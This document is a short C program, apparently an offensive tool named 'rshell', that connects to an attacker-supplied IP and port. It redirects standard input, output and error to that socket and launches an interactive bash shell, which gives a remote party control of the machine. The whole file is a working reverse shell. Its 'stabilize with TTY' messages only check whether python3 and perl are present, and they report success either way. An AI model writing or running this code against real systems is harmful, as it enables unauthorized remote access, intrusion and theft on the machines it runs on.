#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int USAGE(int argc){
        if (argc < 2) {
                printf( "Usage: ./rshell ip port\n" );
                exit( 0 );
        }
}

int EXISTS(const char *path){
    FILE *fptr = fopen(path, "r");
    if (fptr == NULL)
        return 0;
    fclose(fptr);
    return 1;
}

int main(int argc, char * argv[]){
        argc--;   argv++;
        char *args[] = {"/usr/bin/bash", "-i", 0};
        char *envp[] = {"/usr/bin/bash", 0};
        USAGE(argc);
        struct sockaddr_in revsockaddr;

        puts("[i] Connecting");

        int sockt = socket(AF_INET, SOCK_STREAM, 0);
        revsockaddr.sin_family = AF_INET;
        revsockaddr.sin_port = htons(atoi(argv[1]));
        revsockaddr.sin_addr.s_addr = inet_addr(argv[0]);
        connect(sockt, (struct sockaddr *) &revsockaddr,
        sizeof(revsockaddr));
        dup2(sockt, 0);
        dup2(sockt, 1);
        dup2(sockt, 2);

        puts("[+] Connected");
        puts("[i] Trying to stabilize shell with TTY");
        if(EXISTS("/usr/bin/python3")){
                puts("[+] Python3 is on the machine.");
        } else { puts("[-] Python3 is not on the machine.");}
        if(EXISTS("/usr/bin/perl")){
                puts("[+] Perl is on the machine.");   
        } else{ puts("[-] Perl os not on the machine.");}
        puts("[+] Stabilized");
        execve(args[0], &args[0], envp);
        return 0;
}
